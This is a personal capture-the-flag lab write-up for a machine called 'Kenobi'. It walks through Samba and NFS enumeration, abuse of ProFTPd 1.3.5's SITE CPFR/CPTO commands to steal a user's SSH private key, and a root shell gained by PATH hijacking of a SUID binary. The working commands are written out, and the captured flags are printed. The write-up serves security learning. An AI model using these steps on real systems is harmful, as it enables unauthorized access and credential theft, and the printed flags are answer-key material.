# Kenobi
Enumerate Samba, manipulate a vulnerable versio of proftpd and escalate priveleges with path var manipulation

## Deploy the vulnerable machine
connect to vpn and deploy
### How many ports are open?
7

## Enumerating Samba for shares
### Using nmap command above, how many shares are found?
They supply us an nmap command and we have a list of shares as a result, 3 shares: ipc, anonymous and print.

## connect to anonymous, list files we can share, wha is the file?
`ls` shows us log.txt

## You can recursively download the smb share too - dl the file, what's the ftp port?
using smbget -R smb://<ip>/anonymous (auto sets our user as rob - probably be a bad thing to leave in logs if i was hacking illegally)
empty password as it's anonymous 
this downloads the log txt file from earlier to our machine and lets us `less` it. 
Big file, quite a bit of info in here. The FTP port is 21

### Earlier nmap scan shows port 111 running rpcbind - enumerate and show mount on this
This seems a bit paint by numbers, don't reall yknow why i'm doing this and just blindly following but let's go
`nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount <ip>`
shows us /var is mounted

## Gain initial access with ProFtpd
### Lets get the version of ProFtpd. Use netcat to connect to the machine on the FTP port. What is the version?
here we just use `nc <ip> <port (21)>`
shows us the version is 1.3.5 and drops us in a cli session

### We can use searchsploit to find exploits for a particular software version. 
### Searchsploit is basically just a command line search tool for exploit-db.com 
### How many exploits are there for the ProFTPd running?
`searchsploit proftpd 1.3.5`
shows us 3 exploits, all to do with file copying

### We're now going to copy kenobi's private key using site cpfr and site cpto commands
### we found /var was a mount we could see, so we move kenobi's private key to the /var/tmp dir
Instructions just show the steps for this, while connected via netcat:
`SITE CPFR /home/kenobi/.ssh/id_rsa` < we found this location in the logs. Wonder if we could get etc/passwd and etc/shadow maybe with same method?
`SITE CPTO /var/tmp/id_rsa` < key should now be accessible via mounting

### Lets mount the /var/tmp directory to our machine
again, instructions show steps for this
`mkdir /mnt/kenobiNFS` < make a mount dir to use
`mount <machine ip>:/var /mnt/kenobiNFS` < mounts the remote folder to our machine
`ls -la /mnt/kenobiNFS` < confirm the contents
`cp /mnt/kenobiNFS/tmp/id_rsa .` < copies the key to our machine for use
Tried to ssh here, but get an error that the key's permissions are too open and I need to use the password
`sudo chmod 600 id_rsa` changes those permissions to owner RW only
`ssh -i id_rsa -l kenobi <machine ip>` logs us in to the machine via SSH.
`ls` to find the flag, `cat user.txt` to read it
'd0b0f3f53b6caa532a83915e19224899'

## Privilege Escalation with Path Variable Manipulation
## Find suid files - which is most out of the ordinary?
`find / -perm -u=s -type f 2>/dev/null` find suid files, send errors to the black hole
finds us a few interesting ones, chief unusual file is /usr/bin/menu

## run the binary, how many options appear?
3 options:
- status check
- kernel version
- ifconfig

Running strings on the binary shows us that the file isn't using a full path, ie 'curl' instead of '/usr/bin/curl' meaning it's using the path
path is writeable, so we can add another folder in there so that when menu calls curl as root, it'll call our alias instead.
`echo /bin/sh > curl` makes a file named curl, which is just invoking a shell
`chmod 777 curl`, allows all permissions for this file
`export PATH=/tmp:$PATH` adds our tmp folder to path
`/usr/bin/menu` invokes the menu, then when choosing status check (which invokes curl) - we'll have our root shell 
`cat /root/root.txt` gets us our flag and voila: '177b3cd8562289f37382721c28381f02'
